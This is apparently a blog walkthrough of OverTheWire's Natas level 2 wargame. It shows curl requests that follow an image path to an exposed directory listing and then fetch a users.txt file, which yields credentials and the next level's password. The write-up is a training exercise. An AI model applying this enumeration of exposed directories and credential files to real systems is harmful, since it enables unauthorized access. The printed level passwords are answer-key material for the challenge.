---
title: "Natas Level 2"
date: 2026-02-16T15:10:00-06:00
draft: false
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas2`
- **Password:** `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- **URL:** <http://natas2.natas.labs.overthewire.org>

From here on we can safely ignore `<script>` and `<link>` in the source; they're just headers and not part of the puzzle.

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org
```

Relevant part of the response (body):

```html
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body>
```

The only interesting part is the image: it's loaded from `files/pixel.png`. The image itself isn't the goal; where it's coming from is. We can check whether the `files` directory has any leads. Point your URL at that path:

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/
```

Directory listing:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /files</title>
 </head>
 <body>
<h1>Index of /files</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2025-10-14 09:06  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-10-14 09:06  </td><td align="right">145 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80</address>
</body></html>
```

Besides the image we already saw, the listing shows `users.txt`. Fetch it by requesting that URL:

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt
```

```text
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Seems like an intern forgot to delete some sensitive files..

**Password for natas3:** `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
